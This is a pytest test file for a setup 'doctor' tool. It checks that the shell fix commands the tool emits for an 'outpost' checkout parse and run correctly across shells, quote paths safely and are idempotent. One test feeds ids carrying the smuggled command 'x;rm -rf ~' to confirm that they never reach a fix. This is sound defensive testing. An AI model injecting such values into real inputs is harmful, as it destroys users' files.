        self.default_checkout = self.home / "code" / "outpost"
        self.logs = tmp_path / "logs"
        self.logs.mkdir()
        self.gh_log = self.logs / "gh.log"
        self.npm_log = self.logs / "npm.log"
        bindir = tmp_path / "bin"
        bindir.mkdir()
        self._stub(bindir / "gh", f'printf \'%s\\n\' "$*" >> "{self.gh_log}"\nmkdir -p "$4"\n')
        self._stub(
            bindir / "npm",
            f'printf \'%s\\n\' "$*" >> "{self.npm_log}"\n'
            'if [ "$1" = run ]; then mkdir -p dist/server && echo built > dist/server/index.js; fi\n',
        )
        self._stub(bindir / "fake-editor", 'printf \'checkout = "%s"\\n\' "$FAKE_EDITOR_CHECKOUT" > "$1"\n')
        (tmp_path / "supervisor").mkdir()
        (tmp_path / "supervisor" / "outpost.service").write_text("[Unit]\n")
        self.shell_env = {
            "HOME": self.env["HOME"],
            "OUTPOST_CONFIG_DIR": self.env["OUTPOST_CONFIG_DIR"],
            "XDG_CONFIG_HOME": self.env["XDG_CONFIG_HOME"],
            "TMPDIR": str(tmp_path),
            "PATH": f"{bindir}:/usr/bin:/bin",
        }

    @staticmethod
    def _stub(path: Path, body: str) -> None:
        path.write_text("#!/bin/sh\n" + body)
        path.chmod(0o755)

    def write_config(self, text: str) -> None:
        self.cfg_dir.mkdir(parents=True, exist_ok=True)
        self.cfg.write_text(text)

    def outpost(self) -> dict:
        return _item(_host_doctor(self.env, self.tmp), "outpost")

    def run(self, fix: str, *, shell: str = "bash", **extra_env: str) -> subprocess.CompletedProcess:
        return subprocess.run(
            [shell, "-c", fix],
            env={**self.shell_env, **extra_env},
            cwd=self.tmp,
            capture_output=True,
            text=True,
            stdin=subprocess.DEVNULL,
            timeout=20,
        )

    def tree(self) -> set[Path]:
        return {p for p in self.tmp.rglob("*") if not p.is_relative_to(self.logs)}


_OTHER_KEYS = 'other = 1\n[section]\nx = "y"\n'

# One setup per outpost state doctor can report.  The shell-validity and
# executed-transition tests are driven from this table.
_OUTPOST_STATES = {
    "A-no-config": lambda sb: None,
    "B-no-checkout-key": lambda sb: sb.write_config(_OTHER_KEYS),
    "C-checkout-absent": lambda sb: sb.write_config(f'checkout = "{sb.tmp / "far away" / "outpost"}"\n'),
    "D-not-built": lambda sb: (
        (sb.tmp / "co").mkdir(),
        sb.write_config(f'checkout = "{sb.tmp / "co"}"\n'),
    ),
    "E-bad-toml": lambda sb: sb.write_config("checkout = [unclosed\n"),
    "E-relative": lambda sb: sb.write_config('checkout = "code/outpost"\n'),
    "E-non-string": lambda sb: sb.write_config("checkout = 7\n"),
    "E-not-a-directory": lambda sb: (
        (sb.tmp / "afile").write_text("x"),
        sb.write_config(f'checkout = "{sb.tmp / "afile"}"\n'),
    ),
}


_SHELLS = [
    "sh",
    "bash",
    pytest.param(
        "fish",
        marks=pytest.mark.skipif(shutil.which("fish") is None, reason="fish is not installed"),
    ),
]


def _parses(shell: str, fix: str) -> subprocess.CompletedProcess:
    return subprocess.run([shell, "-n", "-c", fix], capture_output=True, text=True)


class TestOutpostFixesRunInEveryShell:
    """Each fix, run exactly as printed through the shell an operator may have, in a spaced path."""

    @staticmethod
    def _sb(tmp_path, state):
        root = tmp_path / "sp ace"
        root.mkdir()
        sb = _OutpostSandbox(root)
        _OUTPOST_STATES[state](sb)
        return sb

    @pytest.mark.parametrize("shell", _SHELLS)
    def test_a_no_config_writes_the_config_and_clones(self, tmp_path, shell):
        sb = self._sb(tmp_path, "A-no-config")
        proc = sb.run(sb.outpost()["fix"], shell=shell)
        assert proc.returncode == 0, proc.stderr
        assert sb.cfg.read_text() == f'checkout = "{sb.default_checkout}"\n'
        assert sb.gh_log.read_text() == f"repo clone trailhead-ai/outpost {sb.default_checkout}\n"

    @pytest.mark.parametrize("shell", _SHELLS)
    def test_b_no_checkout_key_prepends_one(self, tmp_path, shell):
        sb = self._sb(tmp_path, "B-no-checkout-key")
        proc = sb.run(sb.outpost()["fix"], shell=shell)
        assert proc.returncode == 0, proc.stderr
        assert sb.cfg.read_text() == f'checkout = "{sb.default_checkout}"\n' + _OTHER_KEYS

    @pytest.mark.parametrize("shell", _SHELLS)
    def test_c_absent_checkout_is_cloned(self, tmp_path, shell):
        sb = self._sb(tmp_path, "C-checkout-absent")
        target = sb.tmp / "far away" / "outpost"
        proc = sb.run(sb.outpost()["fix"], shell=shell)
        assert proc.returncode == 0, proc.stderr
        assert sb.gh_log.read_text() == f"repo clone trailhead-ai/outpost {target}\n"

    @pytest.mark.parametrize("shell", _SHELLS)
    @pytest.mark.parametrize("name", ["back\\slash", "it's", "tr\\'ail", "two\\\\"])
    def test_c_absent_checkout_with_quote_characters_is_cloned_to_the_exact_path(self, tmp_path, shell, name):
        sb = self._sb(tmp_path, "C-checkout-absent")
        target = sb.tmp / name
        sb.write_config(f"checkout = {json.dumps(str(target))}\n")
        item = sb.outpost()
        assert item["state"] == "missing" and "does not exist" in item["summary"]
        proc = sb.run(item["fix"], shell=shell)
        assert proc.returncode == 0, proc.stderr
        assert sb.gh_log.read_text() == f"repo clone trailhead-ai/outpost {target}\n"

    @pytest.mark.parametrize("shell", _SHELLS)
    def test_d_not_built_is_built_in_the_checkout(self, tmp_path, shell):
        sb = self._sb(tmp_path, "D-not-built")
        proc = sb.run(sb.outpost()["fix"], shell=shell)
        assert proc.returncode == 0, proc.stderr
        assert sb.npm_log.read_text() == "ci\nrun build\n"
        assert (sb.tmp / "co" / "dist" / "server" / "index.js").is_file()

    @pytest.mark.parametrize("shell", _SHELLS)
    @pytest.mark.parametrize("name", ["back\\slash", "it's", "tr\\'ail", "two\\\\"])
    def test_d_a_checkout_name_with_quote_characters_is_built_in_place(self, tmp_path, shell, name):
        sb = self._sb(tmp_path, "D-not-built")
        checkout = sb.tmp / name
        checkout.mkdir()
        sb.write_config(f"checkout = {json.dumps(str(checkout))}\n")
        item = sb.outpost()
        assert item["state"] == "missing" and "not built" in item["summary"]
        proc = sb.run(item["fix"], shell=shell)
        assert proc.returncode == 0, proc.stderr
        assert (checkout / "dist" / "server" / "index.js").is_file()

    @pytest.mark.parametrize("shell", _SHELLS)
    def test_e_bad_config_opens_the_editor_on_it(self, tmp_path, shell):
        sb = self._sb(tmp_path, "E-bad-toml")
        proc = sb.run(
            sb.outpost()["fix"], shell=shell, EDITOR="fake-editor", FAKE_EDITOR_CHECKOUT=str(sb.tmp)
        )
        assert proc.returncode == 0, proc.stderr
        assert sb.cfg.read_text() == f'checkout = "{sb.tmp}"\n'


class TestOutpostStatesExecuted:
    def _sb(self, tmp_path, state):
        sb = _OutpostSandbox(tmp_path)
        _OUTPOST_STATES[state](sb)
        return sb

    def test_a_no_config_becomes_not_built_and_then_ok(self, tmp_path):
        sb = self._sb(tmp_path, "A-no-config")
        item = sb.outpost()
        assert item["state"] == "missing"
        before = sb.tree()
        assert sb.run(item["fix"]).returncode == 0
        assert sb.tree() - before == {
            sb.cfg_dir, sb.cfg, sb.home / "code", sb.default_checkout
        }
        assert sb.cfg.read_text() == f'checkout = "{sb.default_checkout}"\n'
        assert sb.gh_log.read_text() == f"repo clone trailhead-ai/outpost {sb.default_checkout}\n"
        after = sb.outpost()
        assert after["state"] == "missing" and "not built" in after["summary"]
        assert sb.run(after["fix"]).returncode == 0
        assert sb.outpost()["state"] == "ok"

    def test_a_rerun_is_a_no_op(self, tmp_path):
        sb = self._sb(tmp_path, "A-no-config")
        fix = sb.outpost()["fix"]
        assert sb.run(fix).returncode == 0
        snapshot = (sb.cfg.read_bytes(), sb.tree(), sb.gh_log.read_bytes())
        assert sb.run(fix).returncode == 0
        assert (sb.cfg.read_bytes(), sb.tree(), sb.gh_log.read_bytes()) == snapshot

    def test_b_a_config_without_checkout_gains_one_and_keeps_its_other_keys(self, tmp_path):
        import tomllib

        sb = self._sb(tmp_path, "B-no-checkout-key")
        item = sb.outpost()
        assert item["state"] == "missing"
        assert "checkout" in item["summary"]
        before = sb.tree()
        assert sb.run(item["fix"]).returncode == 0
        text = sb.cfg.read_text()
        parsed = tomllib.loads(text)
        assert parsed["checkout"] == str(sb.default_checkout)
        assert parsed["other"] == 1 and parsed["section"] == {"x": "y"}
        assert text.count("checkout") == 1
        assert _OTHER_KEYS in text
        assert sb.tree() - before == {sb.home / "code", sb.default_checkout}
        assert sb.outpost()["state"] == "missing" and "not built" in sb.outpost()["summary"]

    def test_b_rerun_is_a_no_op(self, tmp_path):
        sb = self._sb(tmp_path, "B-no-checkout-key")
        fix = sb.outpost()["fix"]
        assert sb.run(fix).returncode == 0
        snapshot = (sb.cfg.read_bytes(), sb.tree(), sb.gh_log.read_bytes())
        assert sb.run(fix).returncode == 0
        assert (sb.cfg.read_bytes(), sb.tree(), sb.gh_log.read_bytes()) == snapshot

    def test_c_absent_checkout_is_cloned_where_the_config_says_and_becomes_not_built(self, tmp_path):
        sb = self._sb(tmp_path, "C-checkout-absent")
        target = sb.tmp / "far away" / "outpost"
        item = sb.outpost()
        assert item["state"] == "missing"
        assert str(target) in item["summary"]
        config_before = sb.cfg.read_bytes()
        before = sb.tree()
        assert sb.run(item["fix"]).returncode == 0
        assert sb.gh_log.read_text() == f"repo clone trailhead-ai/outpost {target}\n"
        assert sb.tree() - before == {target.parent, target}
        assert sb.cfg.read_bytes() == config_before
        after = sb.outpost()
        assert after["state"] == "missing" and "not built" in after["summary"]

    def test_c_rerun_is_a_no_op(self, tmp_path):
        sb = self._sb(tmp_path, "C-checkout-absent")
        fix = sb.outpost()["fix"]
        assert sb.run(fix).returncode == 0
        snapshot = (sb.cfg.read_bytes(), sb.tree(), sb.gh_log.read_bytes())
        assert sb.run(fix).returncode == 0
        assert (sb.cfg.read_bytes(), sb.tree(), sb.gh_log.read_bytes()) == snapshot

    def test_d_not_built_is_built_in_the_configured_checkout(self, tmp_path):
        sb = self._sb(tmp_path, "D-not-built")
        item = sb.outpost()
        assert item["state"] == "missing" and "not built" in item["summary"]
        assert sb.run(item["fix"]).returncode == 0
        assert sb.npm_log.read_text() == "ci\nrun build\n"
        assert (sb.tmp / "co" / "dist" / "server" / "index.js").is_file()
        assert sb.outpost()["state"] == "ok"

    @pytest.mark.parametrize(
        "state, wrong",
        [
            ("E-bad-toml", "not valid TOML"),
            ("E-relative", "checkout must be an absolute path"),
            ("E-non-string", "checkout must be an absolute path"),
            ("E-not-a-directory", "is not a directory"),
        ],
    )
    def test_e_malformed_config_names_what_is_wrong_and_opens_the_editor(self, tmp_path, state, wrong):
        sb = self._sb(tmp_path, state)
        item = sb.outpost()
        assert item["state"] == "missing"
        assert wrong in item["summary"]
        assert str(sb.cfg) in item["fix"]
        assert sb.run(item["fix"], EDITOR="fake-editor", FAKE_EDITOR_CHECKOUT=str(sb.tmp)).returncode == 0
        assert sb.cfg.read_text() == f'checkout = "{sb.tmp}"\n'
        assert "not built" in sb.outpost()["summary"]

    def test_f_an_unresolvable_config_path_could_not_be_checked(self, tmp_path):
        sb = _OutpostSandbox(tmp_path)
        sb.env["OUTPOST_CONFIG_DIR"] = "relative/config"
        item = sb.outpost()
        assert item["state"] == "could-not-check"
        assert "config directory could not be resolved" in item["summary"]
        assert "OUTPOST_CONFIG_DIR" in item["summary"]
        assert "fix" not in item

    @pytest.mark.parametrize(
        "text",
        ['[server]\ncheckout = "/x"\n', "other = 1\n[a]\n  checkout = 5\n", 'k = """\ncheckout = "/y"\n"""\n'],
        ids=["in-table", "indented-in-table", "in-multiline-string"],
    )
    def test_b_a_checkout_key_only_inside_a_table_still_converges(self, tmp_path, text):
        import tomllib

        sb = _OutpostSandbox(tmp_path)
        sb.write_config(text)
        item = sb.outpost()
        assert item["state"] == "missing" and "has no checkout key" in item["summary"]
        assert sb.run(item["fix"]).returncode == 0
        written = sb.cfg.read_text()
        first, rest = written.split("\n", 1)
        assert first == f'checkout = "{sb.default_checkout}"'
        assert rest == text
        assert tomllib.loads(written)["checkout"] == str(sb.default_checkout)
        after = sb.outpost()
        assert "has no checkout key" not in after["summary"]
        assert after["state"] == "missing" and "not built" in after["summary"]
        snapshot = (sb.cfg.read_bytes(), sb.tree())
        assert sb.run(item["fix"]).returncode == 0
        assert (sb.cfg.read_bytes(), sb.tree()) == snapshot

    @pytest.mark.parametrize("kind", ["directory", "dangling-symlink"])
    def test_h_a_config_path_that_is_not_a_regular_file_could_not_be_checked(self, tmp_path, kind):
        sb = _OutpostSandbox(tmp_path)
        sb.cfg_dir.mkdir(parents=True)
        if kind == "directory":
            sb.cfg.mkdir()
        else:
            sb.cfg.symlink_to(sb.tmp / "nowhere")
        item = sb.outpost()
        assert item["state"] == "could-not-check"
        assert str(sb.cfg) in item["summary"]
        assert "not a regular file" in item["summary"]
        assert "fix" not in item

    def test_i_a_config_that_cannot_be_read_could_not_be_checked(self, tmp_path, monkeypatch):
        sb = _OutpostSandbox(tmp_path)
        sb.write_config('checkout = "/x"\n')
        real_open = Path.open

        def fail(self, *a, **k):
            if self == sb.cfg:
                raise PermissionError(13, "Permission denied")
            return real_open(self, *a, **k)

        monkeypatch.setattr(Path, "open", fail)
        item = sb.outpost()
        assert item["state"] == "could-not-check"
        assert str(sb.cfg) in item["summary"] and "could not be read" in item["summary"]
        assert "fix" not in item

    def test_g_every_state_emits_its_own_fix(self, tmp_path):
        fixes = _outpost_state_fixes(tmp_path)
        by_letter = {}
        for state, fix in fixes.items():
            by_letter.setdefault(state[0], set()).add(fix.replace(str(tmp_path / state), "<t>"))
        assert set(by_letter) == set("ABCDE")
        assert len({next(iter(v)) for v in by_letter.values()}) == 5


def _outpost_state_fixes(tmp_path: Path) -> dict[str, str]:
    """The outpost fix doctor emits in each state of _OUTPOST_STATES."""
    fixes = {}
    for state in _OUTPOST_STATES:
        (tmp_path / state).mkdir()
        sb = TestOutpostStatesExecuted._sb(None, tmp_path / state, state)
        item = sb.outpost()
        assert item["state"] == "missing", state
        fixes[state] = item["fix"]
    return fixes


def _fixes_by_case(tmp_path):
    """Every fix doctor can emit, keyed by the scenario that produced it."""
    out = {}
    lore_missing = [
        {"id": "signing", "state": "missing", "summary": "x"},
        {"id": "vault:default", "state": "missing", "summary": "x"},
        {"id": "forge:default", "state": "missing", "summary": "x"},
        {"id": "author", "state": "missing", "summary": "x"},
    ]
    scenarios = {
        "outpost-config": dict(outpost=False),
        "supervisor": dict(supervisor=False),
    }
    for label, host in scenarios.items():
        (tmp_path / label).mkdir()
        r = _doctor(tmp_path / label, lore_missing, **host)
        for item in r.data["readiness"]["items"]:
            if "fix" in item:
                out[f"{label}/{item['id']}"] = item["fix"]
    return out


class TestFixesAreShell:
    @pytest.mark.parametrize("shell", _SHELLS)
    def test_every_fix_doctor_emits_parses_as_shell(self, tmp_path, shell):
        fixes = _fixes_by_case(tmp_path)
        assert {k.split("/", 1)[1] for k in fixes} >= {
            "outpost", "supervisor", "signing", "vault:default", "forge:default", "author"
        }
        for key, fix in fixes.items():
            proc = _parses(shell, fix)
            assert proc.returncode == 0, f"{shell}: {key}: {fix!r}: {proc.stderr}"

    @pytest.mark.parametrize("shell", _SHELLS)
    def test_every_outpost_state_fix_parses_as_shell(self, tmp_path, shell):
        for state, fix in _outpost_state_fixes(tmp_path).items():
            proc = _parses(shell, fix)
            assert proc.returncode == 0, f"{shell}: {state}: {fix!r}: {proc.stderr}"

    @pytest.mark.parametrize("shell", _SHELLS)
    def test_a_fix_with_a_spaced_path_parses(self, tmp_path, shell):
        spaced = tmp_path / "sp ace"
        spaced.mkdir()
        for state, fix in _outpost_state_fixes(spaced).items():
            proc = _parses(shell, fix)
            assert proc.returncode == 0, f"{shell}: {state}: {fix!r}: {proc.stderr}"

    def test_a_hostile_lore_id_never_reaches_a_fix(self, tmp_path):
        items = [
            {"id": "vault:x;rm -rf ~", "state": "missing", "summary": "s"},
            {"id": "forge:x;rm -rf ~", "state": "missing", "summary": "s"},
        ]
        r = _doctor(tmp_path, items)
        fixes = [i["fix"] for i in r.data["readiness"]["items"] if "fix" in i and i["id"].endswith("x;rm -rf ~")]
        assert len(fixes) == 2
        for fix in fixes:
            assert ";" not in fix and "rm" not in fix
            assert subprocess.run(["bash", "-n", "-c", fix]).returncode == 0
        for line in r.human_output.splitlines():
            if line.strip().startswith("fix:"):
                assert "rm -rf" not in line


class TestVaultFix:
    def test_a_missing_vault_is_pointed_at_lore_status_not_vault_add(self, tmp_path):
        items = [dict(i) for i in _LORE_OK_ITEMS]
        items[1] = {"id": "vault:team-notes", "state": "missing", "summary": "not a git repo"}
        r = _doctor(tmp_path, items)
        item = _item(r, "vault:team-notes")
        assert item["fix"] == "lore status"
        assert item["step"] == doctor.STEP_VAULTS


class TestStepOrder:
    def test_forge_credential_comes_before_outpost(self, tmp_path):
        items = [dict(i) for i in _LORE_OK_ITEMS]
        for i in items:
            if i["id"] == "forge:default":
                i["state"] = "missing"
        r = _doctor(tmp_path, items, outpost=False)
        ids = [i["id"] for i in r.data["readiness"]["items"]]
        assert ids.index("forge:default") < ids.index("outpost")
        forge = _item(r, "forge:default")
        outpost = _item(r, "outpost")
        assert (forge["step"], outpost["step"]) == (2, 3)


class TestOutpostFixes:
    def test_absent_config_fix_targets_the_resolved_config_dir(self, tmp_path):
        r = _doctor(tmp_path, outpost=False)
        fix = _item(r, "outpost")["fix"]
        assert str(tmp_path / "outpost-config" / "config.toml") in fix
        assert "~/.config/outpost" not in fix

    def test_absent_config_fix_follows_xdg_when_no_override(self, tmp_path):
        env = _prepare_host(tmp_path, outpost=False)
        del env["OUTPOST_CONFIG_DIR"]
        r = _host_doctor(env, tmp_path)
        assert str(tmp_path / "xdg-config" / "outpost" / "config.toml") in _item(r, "outpost")["fix"]

    def test_unbuilt_fix_builds_the_configured_checkout_and_does_not_clone(self, tmp_path):
        r = _doctor(tmp_path, built=False)
        fix = _item(r, "outpost")["fix"]
        checkout = tmp_path / "outpost-checkout"
        assert f"sh {checkout}" in fix
        assert "npm run build" in fix
        assert "clone" not in fix

    def test_unbuilt_fix_shell_quotes_a_checkout_path_with_spaces(self, tmp_path):
        env = _prepare_host(tmp_path, built=False)
        spaced = tmp_path / "out post"
        spaced.mkdir()
        (Path(env["OUTPOST_CONFIG_DIR"]) / "config.toml").write_text(f'checkout = "{spaced}"\n')
        r = _host_doctor(env, tmp_path)
        fix = _item(r, "outpost")["fix"]
        assert f"sh '{spaced}'" in fix
        assert subprocess.run(["bash", "-n", "-c", fix]).returncode == 0


class TestOutpostConfigFixIdempotence:
    def _setup(self, tmp_path):
        env = _prepare_host(tmp_path, outpost=False)
        home = Path(env["HOME"])
        (home / "code" / "outpost").mkdir(parents=True)
        bindir = tmp_path / "bin"
        bindir.mkdir()
        gh_log = tmp_path / "gh.log"
        gh = bindir / "gh"
        gh.write_text(f'#!/bin/sh\necho "$@" >> {gh_log}\nexit 1\n')
        gh.chmod(0o755)
        run_env = {
            "HOME": env["HOME"],
            "OUTPOST_CONFIG_DIR": env["OUTPOST_CONFIG_DIR"],
            "XDG_CONFIG_HOME": env["XDG_CONFIG_HOME"],
            "TMPDIR": str(tmp_path),
            "PATH": f"{bindir}:/usr/bin:/bin",
        }
        fix = _item(_host_doctor(env, tmp_path), "outpost")["fix"]
        return fix, run_env, gh_log, home

    def _run(self, fix, run_env, cwd):
        return subprocess.run(
            ["bash", "-c", fix], env=run_env, cwd=cwd, capture_output=True, text=True
        )

    def test_running_twice_leaves_the_first_runs_file_byte_identical(self, tmp_path):
        import tomllib

        fix, run_env, gh_log, home = self._setup(tmp_path)
        cfg = Path(run_env["OUTPOST_CONFIG_DIR"]) / "config.toml"
        first = self._run(fix, run_env, tmp_path)
        assert first.returncode == 0, first.stderr
        written = cfg.read_bytes()
        assert tomllib.loads(written.decode())["checkout"] == str(home / "code" / "outpost")
        second = self._run(fix, run_env, tmp_path)
        assert second.returncode == 0, second.stderr
        assert cfg.read_bytes() == written

    def test_an_existing_config_is_never_overwritten(self, tmp_path):
        fix, run_env, gh_log, home = self._setup(tmp_path)
        cfg_dir = Path(run_env["OUTPOST_CONFIG_DIR"])
        cfg_dir.mkdir(parents=True)
        (cfg_dir / "config.toml").write_bytes(b'checkout = "/elsewhere"\n')
        assert self._run(fix, run_env, tmp_path).returncode == 0
        assert (cfg_dir / "config.toml").read_bytes() == b'checkout = "/elsewhere"\n'

    def test_an_existing_checkout_is_not_cloned_again(self, tmp_path):
        fix, run_env, gh_log, home = self._setup(tmp_path)
        assert self._run(fix, run_env, tmp_path).returncode == 0
        assert not gh_log.exists()

    def test_a_missing_checkout_is_cloned_with_gh(self, tmp_path):
        fix, run_env, gh_log, home = self._setup(tmp_path)
        (home / "code" / "outpost").rmdir()
        self._run(fix, run_env, tmp_path)
        assert gh_log.read_text().startswith("repo clone trailhead-ai/outpost ")
        assert not (Path(run_env["OUTPOST_CONFIG_DIR"]) / "config.toml").exists()

    def test_the_fix_writes_nothing_outside_its_tmp_dirs(self, tmp_path):
        fix, run_env, gh_log, home = self._setup(tmp_path)
        before = {p for p in tmp_path.rglob("*")}
        assert self._run(fix, run_env, tmp_path).returncode == 0
        created = {p for p in tmp_path.rglob("*")} - before
        assert created == {Path(run_env["OUTPOST_CONFIG_DIR"]), Path(run_env["OUTPOST_CONFIG_DIR"]) / "config.toml"}
        for var in ("HOME", "OUTPOST_CONFIG_DIR", "XDG_CONFIG_HOME", "TMPDIR"):
            assert Path(run_env[var]).is_relative_to(tmp_path)
        assert run_env["PATH"].split(":")[0].startswith(str(tmp_path))
